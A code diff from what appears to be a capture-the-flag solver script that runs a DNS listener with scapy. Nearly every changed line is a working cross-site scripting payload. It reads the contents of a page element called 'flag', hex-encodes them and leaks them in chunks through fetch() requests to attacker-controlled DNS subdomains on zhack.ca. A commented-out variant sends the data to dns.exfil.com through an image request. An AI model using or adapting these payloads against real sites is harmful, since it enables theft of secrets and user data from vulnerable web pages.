@@ -2,8 +2,7 @@ import socket
 from scapy.all import DNS, DNSQR, DNSRR, raw
 
 
-xss = 'a="";document.getElementById("flag").innerText.split("").forEach((r)=>{a+=r.charCodeAt(0).toString(16)});a=a.substring(0,40);'
-payload = '<img/src="http://ffffffuck.6d5c01f74b3f86e79153.d.zhack.ca"/>'
+payload = '<script>a=``;document.getElementById(`flag`).innerText.split(``).forEach((r)=>{a+=r.charCodeAt(0).toString(16)});fetch(`http://`+a.length+`.026d0fea5c4ad465e920.d.zhack.ca`);a.match(/.{1,55}/g).forEach((r,a)=>{fetch(`http://`+String(a)+`_`+r+`.62bf1cf869b968a6f40d.d.zhack.ca`)});</script>'
 # payload = '</pre><script>a="";document.getElementById("flag").innerText.split("").forEach((r)=>{a+=r.charCodeAt(0).toString(16)});a=a.substring(0,40);document.createElement("img").src="http://"+a+".dns.exfil.com/x.png";</script>'
 
 log = open('log.txt', 'w+b')
